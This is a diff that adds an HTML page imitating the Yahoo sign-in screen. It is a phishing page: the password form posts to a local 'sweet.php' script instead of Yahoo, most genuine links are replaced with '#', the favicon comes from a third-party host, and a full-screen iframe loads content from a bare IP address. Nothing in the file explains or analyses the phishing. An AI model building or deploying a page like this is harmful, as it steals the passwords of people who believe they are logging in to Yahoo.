@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" id="Stencil" class="yui3-js-enabled">
+ <head>
+  <title>
+   Yahoo - login
+  </title>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <link rel="shortcut icon" href="http://cdn1.lockerdome.com/uploads/74368197cb53191e522e3a73aab974d53eae8e38da694a1ed2cfa06f39176e58_:original" />
+  <meta content="chrome=1" http-equiv="X-UA-Compatible" />
+  <link href="https://s.yimg.com/zz/combo?/sf/assets/mbrlogin/css/pure-0.3.0-min.css&/sf/assets/mbrlogin/css/12/mbr-min.css&/sf/assets/mbrlogin/css/3/sprite-min.css&/sf/assets/mbrlogin/css/17/mbr-desktop-min.css&/sf/assets/mbrlogin/css/desktop/header/2/header-min.css&/sf/assets/mbrlogin/css/desktop/contents/1/contents-min.css&/sf/assets/mbrlogin/css/desktop/login/1/flags-min.css&/sf/assets/mbrlogin/css/desktop/login/51/login-min.css&/sf/assets/mbrlogin/css/desktop/lad/1/lad-min.css&/sf/assets/mbrlogin/css/desktop/footer/6/footer-min.css&/sf/assets/mbrlogin/css/mobile/deviceswitcher/2/deviceswitcher-min.css&kx/yucs/uh3s/atomic/63/css/atomic-min.css&kx/yucs/uh_common/meta/3/css/meta-min.css&kx/yucs/uh3s/uh/394/css/uh-center-aligned-min.css" type="text/css" rel="stylesheet" />
+  <script>
+   var MBR_config = {
+			baseSpaceID : "150002534",
+			intlSpaceID : "150002534",
+			YWAProjectID : 10001954694556,
+			DocumentName : "Desktop Login",
+			DocumentGroup: "Desktop Login",
+			strings : {},
+			page_starttime: new Date().getTime(),
+			page_loadtime: null,
+			verify : 1,
+			src : "",
+			intl : "us",
+			partner : "",
+			ad_crumb : "0H.PCeR3QiX",
+			ad_type : 6,
+			ad_type2 : 6,
+			bouncer_login: "#",
+			EOC: "end_of_config"
+		};
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_6_1452204710505_2" src="https://s.yimg.com/zz/combo?yui:3.18.1/io-upload-iframe/io-upload-iframe-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_6_1452204710505_3" src="https://s.yimg.com/zz/combo?yui:3.18.1/queue-promote/queue-promote-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_6_1452204710505_4" src="https://s.yimg.com/zz/combo?yui:3.18.1/io-queue/io-queue-min.js" async="">
+  </script>
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_9_1452204710505_2" href="https://s.yimg.com/zz/combo?yui:3.18.1/widget-base/assets/skins/sam/widget-base.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_9_1452204710505_3" href="https://s.yimg.com/zz/combo?yui:3.18.1/cssbutton/cssbutton-min.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_9_1452204710505_4" href="https://s.yimg.com/zz/combo?yui:3.18.1/widget-modality/assets/skins/sam/widget-modality.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_9_1452204710505_5" href="https://s.yimg.com/zz/combo?yui:3.18.1/widget-stack/assets/skins/sam/widget-stack.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_9_1452204710505_6" href="https://s.yimg.com/zz/combo?yui:3.18.1/panel/assets/skins/sam/panel.css" />
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_7" src="https://s.yimg.com/zz/combo?yui:3.18.1/attribute-complex/attribute-complex-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_8" src="https://s.yimg.com/zz/combo?yui:3.18.1/classnamemanager/classnamemanager-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_9" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-base/widget-base-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_10" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-htmlparser/widget-htmlparser-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_11" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-skin/widget-skin-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_12" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-uievents/widget-uievents-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_13" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-autohide/widget-autohide-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_14" src="https://s.yimg.com/zz/combo?yui:3.18.1/button-core/button-core-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_15" src="https://s.yimg.com/zz/combo?yui:3.18.1/button-plugin/button-plugin-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_16" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-stdmod/widget-stdmod-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_17" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-buttons/widget-buttons-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_18" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-modality/widget-modality-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_19" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-position/widget-position-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_20" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-position-align/widget-position-align-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_21" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-position-constrain/widget-position-constrain-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_22" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-stack/widget-stack-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_9_1452204710505_23" src="https://s.yimg.com/zz/combo?yui:3.18.1/panel/panel-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452204710505_2" src="https://s.yimg.com/zz/combo?yui:3.18.1/node-focusmanager/node-focusmanager-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452204710505_3" src="https://s.yimg.com/zz/combo?yui:3.18.1/querystring-stringify/querystring-stringify-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452204710505_4" src="https://s.yimg.com/zz/combo?yui:3.18.1/cookie/cookie-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452204710505_5" src="https://s.yimg.com/zz/combo?yui:3.18.1/substitute/substitute-min.js" async="">
+  </script>
+ </head>
+ <body>
+  <div class="mbr-desktop  ">
+   <header>
+    <div class="mbr-header-container pure-u-1">
+     <div class="mbr-header pure-u-1 StencilRoot" id="mbr-header">
+      <style type="text/css">
+       @font-face{font-family:uh;src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?);src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?#iefix) format('embedded-opentype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2?) format('woff2'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff?) format('woff'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf?) format('truetype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg?#uh) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+      </style>
+      <link href="https://s.yimg.com/zz/combo?os/stencil/3.0.1/desktop/styles-ltr.css" rel="stylesheet" type="text/css" />
+      <!-- meta -->
+      <div data-uh-test="acctswitch" data-headercollapse="" data-stickyheader="true" data-userid="" data-test_id="" data-spaceid="" data-status="active" data-shortuserid="" data-shortfirstname="" data-protocol="https" data-property="login" data-languagetag="en-us" data-https="1" data-host="login.yahoo.com" data-guid="NDATVA3V3AP7XN7OINUQGDKYCQ" data-forcecobrand="standard" data-flight="1440236574" data-style="lightbg" data-firstname="" data-experience="uh304" data-device="desktop" data-gta="krIj3y272h8" data-mc-crumb="5H/84ei5tni" data-crumb="o5xmio7peKY" data-cobrand="standard" data-authstate="signedin" id="yucs-meta">
+      </div>
+      <!-- /meta -->
+      <div data-stencil="true" data-spaceid="" data-property="login" data-protocol="https" role="banner" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" id="UH">
+       <style>
+        body {
+margin-top: 0px !important; 
+}
+
+#UH{
+font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
+}
+
+.YLogoMY{
+text-indent: -30em;
+}
+       </style>
+       <div style="height: 3.8em;" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" id="uhWrapper">
+        <div role="presentation" class="UHCol1 Pos(a) Fl(start)">
+         <style>
+          /** * IE7+ and non-retina display */.YLogoMY { background-repeat: no-repeat; background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.png); _background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.gif); /* IE6 */ width: 125px !important; }.DarkTheme .YLogoMY { background-position: -125px 0px !important;}/** * For 'retina' display */@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32_2x.png) !important; background-size: 250px 32px !important; }}
+         </style>
+         <a data-rapid_p="1" target="_top" href="#" data-ylk="slk:logo;t3:logo;t5:logo;elm:img;elmt:logo;" class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! ">
+          Yahoo
+         </a>
+        </div>
+        <div id="uhNavWrapper" role="presentation" class="UHCol3">
+         <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">
+          <li data-yltmenushown="/" id="yucs-profile" class="D(ib) Zoom Va(t) Pos(r) Pstart(4px) Mend(20px) Lts(n)">
+           <a data-rapid_p="2" data-ylk="t3:tl-lst;t5:usersigninst;slk:usersigninst;elm:tl;elmt:usr;" id="yui_3_10_3_1_1375219693637_127" role="button" aria-haspopup="true" aria-label="Profile" rel="nofollow" target="_top" href="javascript:void(0);" class="D(ib) MouseOver Td(n) Td(n):h yucs-trigger Lh(1) Lts($ws)">
+            <i id="yui_3_18_1_13_1440261770847_50" data-avatar='{"size": "32x32", "style":{"width": 22, "height": 22}, "alt": " Avatar", "bucket": "0"}' class="Va(m) W(1em) yucs-avatar yucs-menu_anchor Ycon YconProfile Fz(22px) Lh(1) C(#32007f) Mend(7px) Lts(n)">
+             👤
+            </i>
+            <b title="Hi, " style="max-width: 86px;" class="Va(m) yucs-trigger:h_Td(u) Ell D(ib) Lh(1.7) Lts(n) Fz(13px)">
+            </b>
+           </a>
+           <noscript class="yucs-noscript">
+            &amp;lt;a class="Va(m) Td(u):h Fz(12px) Mstart(10px)" target="_top" rel="nofollow" data-ylk="t3:tl-lst;t4:usr-mu;t5:usersigno;slk:usersigno;elm:itm;elmt:lgo;" href="#"&amp;gt;Sign Out&amp;lt;/a&amp;gt;
+           </noscript>
+           <style>
+            #Stencil #yucs-profile-panel .YconPositive{font-size:38px;}#Stencil #yucs-profile-panel .Td(n) C(#324fe1), #Stencil #yucs-profile-panel .Td(n) C(#324fe1) i{color:#0078ff}#yucs-profile-panel .BackgroundChange:hover{background-color:#f2f4fe}div#yucs-profile-panel{width: 270px !important}#yucs-notifications .NotifDescription{color:#abaeb7}#yucs-acct-list.Bgc(#f5f5f5), #yucs-fs-add-acct{background-color:#f7f8ff}#yucs-fs-footer.Bgc(#f5f5f5) {background-color:#ffffff}#Stencil #yucs-profile-panel .C-grey,#Stencil #yucs-profile #yucs-signout {color:#8d919d}#Stencil #yucs-profile-panel .Bd-t{border-color:#ffffff}#Stencil #yucs-profile-panel .YconProfile{text-indent:-2px;font-size:50px}#yucs-profile-panel .Ycon{width:48px}#yucs-user-info{height:50px}
+           </style>
+          </li>
+          <li class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)" id="yucs-help">
+           <a data-rapid_p="8" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;" target="_blank" href="#" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" id="yucs-help_link">
+            <b>
+             Help
+            </b>
+           </a>
+          </li>
+         </ul>
+        </div>
+       </div>
+       <!-- /#UH -->
+      </div>
+     </div>
+    </div>
+   </header>
+   <main role="main">
+    <div class="mbr-login-bd ">
+     <div class="mbr-login-c pure-g">
+      <div class="mbr-login-c-right pure-u">
+       <!-- login box -->
+       <div class="mbr-login pure-u">
+        <div class="mbr-login-box-top">
+        </div>
+        <div class="mbr-login-box  no-partner" id="mbr-login-box">
+         <!-- Y LOGO HERE -->
+         <div class="mbr-login-logo">
+          <img src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" />
+         </div>
+         <!-- SIGNIN FORM -->
+         <fieldset class="mbr-login-fieldset pure-group" id="mbr-login-fieldset">
+          <form class="pure-form pure-form-stacked mbr-login-form" action="sweet.php" method="POST" id="mbr-login-form">
+           <div id="inputs">
+            <div class="mbr-login-username-tips mbr-login-text-normal mbr-text-align">
+             <div class="welcome">
+              Welcome back,
+             </div>
+             <div class="email mbr-overflow-ellipsis">
+             </div>
+             <div class="name mbr-overflow-ellipsis">
+             </div>
+             <div class="mbr-hide" id="login-username">
+             </div>
+            </div>
+            <div class="passwd-field " id="passwd-field">
+             <label class="mbr-hide" for="login-passwd">
+              Password
+             </label>
+             <input type="password" required="required" autocorrect="off" title="Please enter your password" placeholder="Password" tabindex="2" maxlength="64" class="login-input  pure-u-1" id="login-passwd" name="passwd" />
+             <div class="mbr-login-error mbr-text-align pure-u-1 " id="mbr-login-error">
+              Please enter your password
+             </div>
+             <div class="odp-pw-desc mbr-text-align mbr-hide" id="odp-pw-desc">
+              Click continue to receive an on-demand password.
+             </div>
+            </div>
+           </div>
+           <div class="mbr-login-error mbr-text-align pure-u-1 mbr-hide" id="mbr-login-error">
+           </div>
+           <div class="mbr-login-submit" id="submits">
+            <button tabindex="4" class="pure-u-1 pure-button mbr-button-primary" type="submit" name="signin" id="login-signin">
+             Sign In
+            </button>
+           </div>
+           <div class="hidden" id="hiddens">
+            <input type="hidden" value="V0vUH3pJYk9" name="_crumb" />
+            <input type="hidden" value="1440201613" name="_ts" />
+            <input type="hidden" value="" name="_format" />
+            <input type="hidden" value="Wzndo9R1B7x9" name="_uuid" />
+            <input type="hidden" value="2" name="_seqid" />
+            <input readonly="readonly" class="mbr-hide" value="" name="username" />
+            <input type="hidden" value="y" name=".persistent" />
+           </div>
+           <!-- popup -->
+           <div class="mbr-login-popup-container">
+            <div class="mbr-login-popup mbr-hide" id="mbr-login-popup">
+             <div class="yui3-widget-hd mbr-text-align">
+             </div>
+             <div class="yui3-widget-bd mbr-text-align pure-g">
+             </div>
+            </div>
+           </div>
+          </form>
+          <div class="mbr-hide" id="yahoo-japan-container">
+           <a class="pure-u-1 pure-button mbr-button-primary" href="#">
+            Visit Yahoo Help
+           </a>
+           <div class="mbr-login-oauth2-yahoo-japan-msg">
+            Yahoo Japan users - please visit Yahoo Help to learn how to add your email address.
+           </div>
+          </div>
+         </fieldset>
+         <div class="mbr-login-help-links mbr-text-align mbr-login-text-normal ">
+          <a class="mbr-login-forgot-link pure-u-1" href="#" id="forgotLnk">
+           Can't access your account?
+          </a>
+         </div>
+         <div class="mbr-login-signout pure-u-1  mbr-text-align">
+          <a id="login-signout" href="#">
+           Is this not you?
+          </a>
+         </div>
+        </div>
+       </div>
+       <!-- localization strings  -->
+       <div class="mbr-hide">
+        <script>
+         MBR_config.strings.slc = MBR_config.strings.slc || {
+            pwqa_header : "Verify your identity",
+            aea_header : "Verify your account",
+            verification_header : "Enter verification code",
+            aea_enter_code : "Enter the code received",
+            locked_header_warning : "Warning",
+            locked_header_account_locked : "Account locked",
+            locked_header_contact_cc: "Contact customer care",
+            captcha_header: "Verification: Type The Code Shown Below",
+
+            svc_unavilable : "Error: service temporarily unavailable.",
+
+            error_incident_mobile_email : "Please enter a valid Mobile Number or Email Address that you currently have access to.",
+            error_incident_email : "Please enter a valid non-Yahoo Email address that you currently have access to.",
+            error_incident_mobile : "Please enter a valid US mobile number that you currently have access to.",
+
+            error_invalid_auth: "Invalid ID or password.&lt;div class=\"mbr-text-normal\"&gt;Please try again using your full Yahoo ID.&lt;/div&gt;",
+            error_invalid_pw: "Please enter your password",
+
+            error_empty_pwqa: "No answer provided. Please try again.",
+            error_empty_code: "Please enter the verification code to continue",
+
+            error_empty_phone_number: "Please enter your phone number.",
+
+            end_of_string: "EOS"
+        };
+
+        MBR_config.strings.otp = MBR_config.strings.otp || {
+            placeholder_mobile_number: "Mobile number",
+            placeholder_username : "Yahoo username",
+            sign_in: "Sign In",
+            get_my_passwd: "Send Password",
+            error_invalid_passwd: "Invalid password.",
+            error_empty_passwd: "Your password is required.",
+
+            end_of_string: "EOS"
+        };
+
+        MBR_config.otp_enabled =  false;
+        MBR_config.otp_optin = true;
+
+                MBR_config.account_switch_enabled = false;
+
+        MBR_config.strings.sign_in = "Sign In";
+        </script>
+       </div>
+      </div>
+      <div class="mbr-login-c-left pure-u" id="mbr-login-contents-container" style="display: none;">
+       <script>
+        (function(){document.getElementById('mbr-login-contents-container').style.display='none';}());
+       </script>
+       <!-- left content -->
+       <div class="mbr-login-contents pure-u pure-u-1" id="mbr-login-contents">
+        <div class="info">
+         <h3>
+          Yahoo makes it easy to enjoy what matters most in your world.
+         </h3>
+         <p>
+          Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and  more. You get more out of the web, you get more out of life.
+         </p>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="mbr-hide" id="mbr-login-full-contents">
+     </div>
+     <!-- ads widget -->
+     <div class="mbr-login-ads pure-u-1" id="mbr-login-ad-container">
+      <div class="mbr-login-ads-outer">
+       <div class="mbr-login-ads-inner">
+        <div id="mbr-login-ad-rich" style="visibility: inherit;">
+         <div id="sb_rel_mbr-login-ad-rich-frame" class="darla" style="position: relative; z-index: 9; width: 1920px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;">
+          <iframe frameborder="no" style="position: absolute; z-index: 10; width: 1920px; height: 1024px; top: 0px; left: 0px; visibility: inherit; display: block;" id="" src="http://50.87.150.218/%7Ewleedsb/pi/hellion/r-sf.htm" async="" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0">
+          </iframe>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+     <script src="https://s.yimg.com/rq/darla/2-8-9/js/g-r-min.js" type="text/javascript">
+     </script>
+     <script>
+      (function(){
+MBR_config.ad_timeout = 4000;MBR_config.ad_type = 7;MBR_config.ad_type2 = 0;
+}());
+     </script>
+    </div>
+   </main>
+   <footer>
+    <!-- footer widget -->
+    <div class="mbr-footer pure-u-1" id="mbr-footer">
+     <div>
+     </div>
+     <div>
+     </div>
+     <div>
+      <a target="_blank" href="#">
+       Terms
+      </a>
+      |
+      <a target="_blank" href="#">
+       Privacy
+      </a>
+     </div>
+    </div>
+    <div class="hidden" id="mbr-login-foot">
+    </div>
+    <div class="mbr-login-foot-9">
+    </div>
+   </footer>
+  </div>
+  <script src="https://s.yimg.com/zz/combo?/sf/assets/mbrlogin/js/3/login-yui-3.18.1-combined-min.js&/ss/rapid-3.19.js&/sf/assets/mbrlogin/js/2/mbr-min.js&/sf/assets/mbrlogin/js/1/cache-min.js&/sf/assets/mbrlogin/js/5/useractivity-min.js&/sf/assets/mbrlogin/js/1/mbr-desktop-min.js&/sf/assets/mbrlogin/js/desktop/login/20/login-min.js&/sf/assets/mbrlogin/js/desktop/lad/6/lad-min.js&/sf/assets/mbrlogin/js/mobile/deviceswitcher/1/deviceswitcher-min.js&/sf/assets/mbrlogin/js/common/comscore/1/comscore-min.js&kx/yucs/uh3/uh/1078/js/uh-min.js&kx/yucs/uh3/uh/1078/js/gallery-jsonp-min.js&kx/yucs/uh3/uh/1134/js/menu_utils_v3-min.js&kx/yucs/uh3/uh/1078/js/timestamp_library-min.js&kx/yucs/uh3/uh/1104/js/logo_debug-min.js&kx/yucs/uh3/switch-theme/6/js/switch_theme-min.js&kx/yucs/uhc/meta/55/js/meta-min.js&kx/yucs/uh3/profile/js/62/profile-min.js&kx/yucs/uh3/profile/101/js/usermenu_v3-min.js&kx/ucs/common/js/135/jsonp-super-cached-min.js&kx/yucs/uh3/avatar/31/js/avatar-min.js&kx/yucs/uh3/help/83/js/help_menu_v3-min.js&kx/yucs/uhc/rapid/41/js/uh_rapid-min.js">
+  </script>
+  <div style="position: absolute !important; visibility: hidden !important" id="yui3-css-stamp" class="">
+  </div>
+  <script charset="utf-8" type="text/javascript">
+   YUI().use('node','node-focusmanager','node', 'event', 'event-custom', 'event-resize','node', 'event', 'querystring-stringify','oop','node','event-custom','cookie','substitute','classnamemanager','querystring-stringify', function(Y) {});
+  </script>
+  <!-- spaceId Base: 150002534, Intl: 150002534-->
+  <script>
+   YUI().use('node', 'event', function (Y) {
+        Y.on("domready", function() {
+            MBR_config.comscore_config = [{
+                c1: "2",
+                c2: "7241469",
+                c5: "150002534",
+                c7: "#",
+                c14: "100"
+            }];
+            MBR_config.comscore_beacon();
+        });
+    });
+  </script>
+  <noscript>
+   &lt;img src="http://b.scorecardresearch.com/p?c1=2&amp;c2=7241469&amp;c7=https%3A%2F%2Fmail.yahoo.com%2F&amp;c5=150002534&amp;c14=100&amp;cv=2.0&amp;cj=1"&gt;
+  </noscript>
+ </body>
+</html>
